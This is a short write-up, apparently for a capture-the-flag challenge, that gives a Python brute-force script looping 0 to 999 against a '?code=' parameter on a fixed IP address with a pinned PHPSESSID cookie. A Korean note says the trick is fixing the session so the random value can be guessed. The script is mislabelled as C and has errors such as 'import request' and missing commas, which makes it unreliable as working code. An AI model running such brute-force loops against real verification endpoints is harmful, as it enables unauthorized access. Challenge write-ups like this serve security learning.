payload

```c
import request

base_url = "222.115.10.130:9121/?code="
header = {
	'Accept-Language':"ko-KR ..."
	'Cookie':'PHPSESSID=..'
	'Connection':'close'
}

for i in range(1000):
	url = f'{base_url}{i}'
	res = request.get(url,headers=header)
	print(url)
	if 'worng' not in res.text:
		print(f"{url}")
		print(res.text)
		break
```

----
seesion 값을 고정시켜서 랜덤값을 맞추는 브포 문제이다
